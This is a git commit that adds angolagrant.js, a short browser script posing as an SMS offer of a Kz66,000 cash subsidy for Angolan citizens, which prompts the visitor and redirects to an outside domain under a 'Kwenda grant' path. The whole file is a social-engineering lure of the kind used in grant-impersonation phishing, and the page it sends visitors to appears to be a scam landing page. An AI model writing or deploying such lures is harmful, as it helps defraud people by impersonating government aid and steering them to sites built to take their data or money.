20a5eb465b54e4abff60c310d510958b7b6595f7
newetijazz10 <newetijazz10@gmail.com>
2026-01-07 11:32:26 +0100

    Create angolagrant.js

---
+++ angolagrant.js
@@ -0,0 +1,5 @@
+var password = 'Retirar Kz66.000'
+password=prompt('SMS: Verifique se tem direito ao subsídio em dinheiro de Kz66000 para cidadãos angolanos. Clique em OK para receber esta oferta..','Retirar Kz66.000');
+if (password != 'Retirar Kz66.000') {
+location.href='https://www.favmrzi.online/Kwenda-Kz66000-grant';
+}
